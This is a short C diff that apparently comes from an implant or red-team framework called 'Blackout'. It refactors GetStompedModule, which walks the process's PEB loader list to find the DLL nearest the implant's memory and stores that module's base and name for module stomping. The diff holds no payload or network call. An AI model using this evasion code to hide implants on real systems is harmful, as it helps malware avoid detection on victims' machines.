@@ -40,10 +40,11 @@ FUNC VOID GetStompedModule(
     
     PVOID          CurAddr           = NULL;
     PVOID          ClosestModuleBase = NULL;
-    ULONG_PTR      MinDistance       = (ULONG_PTR)-1; 
+    UNICODE_STRING ClosestModuleName = { 0 };
+    ULONG_PTR      MinDistance       = (ULONG_PTR)-1;
 
     CurAddr = Instance()->Blackout.Region.Base;
-    Head    = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList; 
+    Head    = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
 
     for ( Entry = Head->Flink; Entry != Head; Entry = Entry->Flink ) {
         Data = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );
@@ -55,11 +56,19 @@ FUNC VOID GetStompedModule(
                                  : (ULONG_PTR)CurAddr    - (ULONG_PTR)ModuleBase;
 
         if ( Distance < MinDistance ) {
-            MinDistance       = Distance; 
-            ClosestModuleBase = ModuleBase;  
-            Blackout().Stomp.UsMod   = Data->BaseDllName;
-            Blackout().Stomp.ModBase = Data->DllBase;
+            MinDistance       = Distance;
+            ClosestModuleBase = ModuleBase;
+            ClosestModuleName = Data->BaseDllName;
         }
+    }
+
+    Blackout().Stomp.ModBase        = ClosestModuleBase;
+    Blackout().Stomp.ModName.Buffer = bkHeapAlloc( ClosestModuleName.MaximumLength );
+
+    if ( Blackout().Stomp.ModName.Buffer ) {
+        MmCopy( Blackout().Stomp.ModName.Buffer, ClosestModuleName.Buffer, ClosestModuleName.MaximumLength );
+        Blackout().Stomp.ModName.Length        = ClosestModuleName.Length;
+        Blackout().Stomp.ModName.MaximumLength = ClosestModuleName.MaximumLength;
     }
 
     return;
